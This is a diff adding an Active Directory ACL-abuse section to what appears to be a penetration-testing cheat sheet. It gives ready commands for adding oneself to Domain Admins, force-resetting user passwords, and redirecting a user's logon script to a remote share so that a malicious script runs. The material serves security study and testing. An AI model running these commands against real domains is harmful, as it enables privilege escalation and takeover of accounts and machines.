@@ -44,6 +44,7 @@
       - [Drop the MIC](#drop-the-mic)
       - [Ghost Potato - CVE-2019-1384](#ghost-potato---cve-2019-1384)
     - [Dangerous Built-in Groups Usage](#dangerous-built-in-groups-usage)
+    - [Abusing Active Directory ACLs/ACEs](#abusing-active-directory-acls-aces)
     - [Trust relationship between domains](#trust-relationship-between-domains)
     - [Child Domain to Forest Compromise - SID Hijacking](#child-domain-to-forest-compromise---sid-hijacking)
     - [Unconstrained delegation](#unconstrained-delegation)
@@ -984,6 +985,15 @@ Get-ADGroup -LDAPFilter "(objectcategory=group) (admincount=1)"
 or
 ([adsisearcher]"(AdminCount=1)").findall()
 ```
+
+### Abusing Active Directory ACLs/ACEs
+
+* **GenericAll on User** : We can reset user's password without knowing the current password
+* **GenericAll on Group** : Effectively, this allows us to add ourselves (the user spotless) to the Domain Admin group : `net group "domain admins" spotless /add /domain`
+* **WriteProperty on Group** : We can again add ourselves to the Domain Admins group and escalate privileges: `net user spotless /domain; Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"; net user spotless /domain`
+* **Self (Self-Membership) on Group** : Another privilege that enables the attacker adding themselves to a group
+* **ForceChangePassword** : we can reset the user's password without knowing their current password: `$c = Get-Credential;Set-DomainUserPassword -Identity changeme -AccountPassword $c.Password -Verbose` 
+* **GenericWrite on User** : WriteProperty on an ObjectType, which in this particular case is Script-Path, allows the attacker to overwrite the logon script path of the delegate user, which means that the next time, when the user delegate logs on, their system will execute our malicious script : `Set-ADObject -SamAccountName delegate -PropertyName scriptpath -PropertyValue "\\10.0.0.5\totallyLegitScript.ps1`
 
 ### Trust relationship between domains
 
